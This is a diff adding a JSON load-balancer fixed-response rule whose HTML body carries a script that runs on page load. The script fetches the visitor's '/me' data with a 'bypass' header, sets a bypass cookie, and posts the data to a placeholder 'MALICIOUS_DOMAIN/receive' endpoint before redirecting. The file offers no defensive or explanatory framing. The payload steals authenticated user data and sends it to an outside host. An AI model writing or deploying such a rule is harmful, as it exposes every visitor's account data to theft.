@@ -1,0 +1,11 @@
+[
+    {
+        "Type": "fixed-response",
+        "Order": 1,
+        "FixedResponseConfig": {
+            "MessageBody": "<html lang=\"en\"> <head> <script> async function getDataAndForward() { const response = await fetch('https://YOUR_DOMAIN/me',{ headers: { 'bypass': 'true', }}); const data = await response.text(); document.cookie = \"bypass=true; path=/\"; const forwardResponse = await fetch('https://MALICIOUS_DOMAIN/receive', { method: 'POST', body: data }); window.location.href = window.location.pathname; } window.onload = getDataAndForward; </script> </head> <body> <h1>Loading...</h1> </body> </html>",
+            "StatusCode": "202",
+            "ContentType": "text/html"
+        }
+    }
+]
